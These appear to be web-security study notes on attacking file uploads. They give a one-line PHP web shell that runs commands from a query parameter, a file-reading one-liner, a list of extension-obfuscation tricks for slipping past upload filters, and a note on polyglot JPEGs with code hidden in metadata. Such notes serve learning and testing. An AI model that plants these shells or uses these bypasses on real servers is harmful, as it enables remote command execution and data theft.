A more versatile web shell may look something like this:
```php
<?php echo system($_GET['command']); ?>
```

This script enables you to pass an arbitrary system command via a query parameter as follows: `GET /example/exploit.php?command=id HTTP/1.1`

The following PHP one-liner could be used to read arbitrary files from the server's filesystem: `<?php echo file_get_contents('/path/to/target/file'); ?>`

#### Obfuscating file extensions
`exploit.pHp`
`exploit.php.jpg`
`exploit.php.`
`exploit%2Ephp` --URL encoding
`exploit.asp;.jpg` or `exploit.asp%00.jpg` --Semicolons or URL-encoded null byte characters
`exploit.p.phphp`

### Flawed validation of the file's contents
JPEG files always begin with the bytes `FF D8 FF`
- _magic bytes or magic numbers_
Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.
